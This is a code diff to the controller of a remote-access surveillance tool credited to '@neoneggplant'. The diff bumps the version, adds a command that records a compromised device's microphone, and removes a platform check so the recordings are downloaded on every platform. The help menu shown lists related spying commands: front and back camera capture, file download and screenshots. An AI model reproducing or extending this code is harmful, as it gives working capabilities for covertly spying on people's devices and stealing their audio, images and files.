@@ -40,7 +40,7 @@ BANNER_ART_TEXT = GREEN+"""
  _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
 |_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                     l
-"""+WHITE+"\nVersion: 2.0.7\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
+"""+WHITE+"\nVersion: 2.0.8\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
 BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     1): Start Server
     2): Start Multi Session
@@ -140,6 +140,7 @@ def showHelp(CDA):
         showCommand("download","download file")
         showCommand("frontcam","take picture through front camera")
         showCommand("backcam","take picture through back camera")
+        showCommand("mic","record microphone")
         showCommand("getpid","get process id")
         showCommand("vibrate","make device vibrate")
         showCommand("alert","make alert show up on device")
@@ -226,11 +227,10 @@ def initSHELL(name,conn,host,port,CDA):
                 message = bben(raw_input("Set message: "))
                 sendCMD(args[0] + " " + title + " " + message,conn)
                 continue
-        elif "i386" in CDA:
-            if args[0] == "mic" and len(args) >= 2 and args[1] == "stop":
-                conn.send(encryptStr(command))
-                downloadFile(command,conn)
-                continue
+        if args[0] == "mic" and len(args) >= 2 and args[1] == "stop":
+            conn.send(encryptStr(command))
+            downloadFile(command,conn)
+            continue
         if args[0] == "download" or args[0] == "picture" or args[0] == "frontcam" or args[0] == "backcam" or args[0] == "screenshot":
             downloadFile(command,conn)
         elif args[0] == "installpro":
